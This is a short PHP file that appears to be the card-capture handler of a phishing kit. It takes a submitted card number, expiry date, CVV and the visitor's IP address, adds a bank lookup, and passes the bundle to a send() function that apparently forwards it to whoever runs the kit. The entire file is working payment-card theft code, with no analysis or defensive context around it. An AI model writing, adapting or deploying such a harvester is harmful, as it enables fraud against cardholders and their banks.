<?php
ini_set('display_errors', 1); 
error_reporting(E_ALL);
require_once('../function.php');
require_once('../bin.php');
if(isset($_POST)){
	$ip = $_SERVER['REMOTE_ADDR'];
	$_SESSION['card'] = str_replace(' ','',$_POST['card']);
	$Ak47 = "🗯𝘊𝘙𝘛|𝘉𝘐𝘴𝘮𝘭𝘭𝘢𝘩\n";
	$Ak47 .= "". bin::getbank($_POST['card']) ."\n";
	$Ak47 .= "┌── ".str_replace(' ','',$_POST['card'])."\n";
	$Ak47 .= "├─ ".$_POST['date']."\n";
	$Ak47 .= "└─╼╼ ".$_POST['cvv']."\n";
	$Ak47 .= "".$ip."\n";
    send($Ak47);
}
?>